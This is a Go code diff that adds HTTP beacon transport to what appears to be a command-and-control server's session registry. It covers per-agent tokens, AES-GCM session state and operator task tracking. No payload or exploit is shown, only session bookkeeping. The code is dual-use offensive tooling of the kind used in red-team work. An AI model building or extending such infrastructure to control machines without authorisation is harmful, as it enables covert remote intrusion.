@@ -42,6 +42,12 @@ type Session struct {
 	IsAgent     bool
 	AgentMeta   *proto.Hello      // set after agent handshake; guarded by mu
 	agentTaskCh chan agentTaskReq  // operator → handleAgentSession task channel
+	// HTTP beacon fields — set only for HTTP transport agents (HTTPToken != "").
+	// TCP agents leave these nil/empty.
+	HTTPToken     string               // URL token for /beacon/{token}; also key in registry.httpTokens
+	httpCS        *proto.CryptoSession // per-session AES-256-GCM state for HTTP transport
+	httpInFlight  *agentTaskReq        // task currently outstanding to the HTTP agent
+	httpInflightMu sync.Mutex          // guards httpInFlight
 	// drain goroutine control — guarded by mu.
 	// Non-nil only while a drain goroutine is running (session backgrounded).
 	drainStop chan struct{} // close to stop the drain goroutine
@@ -51,8 +57,9 @@ type Session struct {
 
 // Registry is a thread-safe store of active sessions, numbered 1–1024.
 type Registry struct {
-	mu       sync.Mutex
-	sessions map[int]*Session
+	mu         sync.Mutex
+	sessions   map[int]*Session
+	httpTokens sync.Map // token string → *Session (for HTTP beacon lookup)
 	nextID   int
 }
 
@@ -112,15 +119,68 @@ func (r *Registry) Get(id int) *Session {
 }
 
 // Remove marks a session terminated and removes it from the registry.
+// For HTTP sessions it also deletes the token from httpTokens.
 func (r *Registry) Remove(id int) {
 	r.mu.Lock()
 	defer r.mu.Unlock()
 	if sess, ok := r.sessions[id]; ok {
 		sess.mu.Lock()
 		sess.State = SessionStateTerminated
+		tok := sess.HTTPToken
 		sess.mu.Unlock()
+		if tok != "" {
+			r.httpTokens.Delete(tok)
+		}
 		delete(r.sessions, id)
 	}
+}
+
+// AllocateHTTP creates an HTTP-transport agent session with the given beacon
+// token.  remoteAddr is the agent's IP:port string from the HTTP request.
+// Returns nil if the session limit (1024) is reached.
+func (r *Registry) AllocateHTTP(token, remoteAddr string) *Session {
+	r.mu.Lock()
+	defer r.mu.Unlock()
+
+	id := 0
+	if r.nextID <= 1024 {
+		if _, taken := r.sessions[r.nextID]; !taken {
+			id = r.nextID
+			r.nextID++
+		}
+	}
+	if id == 0 {
+		for i := 1; i <= 1024; i++ {
+			if _, taken := r.sessions[i]; !taken {
+				id = i
+				break
+			}
+		}
+	}
+	if id == 0 {
+		fmt.Println("[!] Session limit reached (1024)")
+		return nil
+	}
+
+	sess := &Session{
+		ID:         id,
+		HTTPToken:  token,
+		RemoteAddr: remoteAddr,
+		StartTime:  time.Now(),
+		State:      SessionStateActive,
+	}
+	r.sessions[id] = sess
+	r.httpTokens.Store(token, sess)
+	return sess
+}
+
+// LookupHTTPToken returns the session associated with an HTTP beacon token,
+// or nil if no such session exists.
+func (r *Registry) LookupHTTPToken(token string) *Session {
+	if v, ok := r.httpTokens.Load(token); ok {
+		return v.(*Session)
+	}
+	return nil
 }
 
 // All returns all sessions sorted ascending by ID.
@@ -135,6 +195,19 @@ func (r *Registry) All() []*Session {
 		return result[i].ID < result[j].ID
 	})
 	return result
+}
+
+// remoteHost returns the host part of the session's remote address.
+// Works for both TCP sessions (Conn.RemoteAddr) and HTTP sessions (RemoteAddr string).
+func (s *Session) remoteHost() string {
+	if s.Conn != nil {
+		return hostFromAddr(s.Conn.RemoteAddr())
+	}
+	host, _, _ := net.SplitHostPort(s.RemoteAddr)
+	if host == "" {
+		return s.RemoteAddr
+	}
+	return host
 }
 
 // Count returns the number of registered sessions.
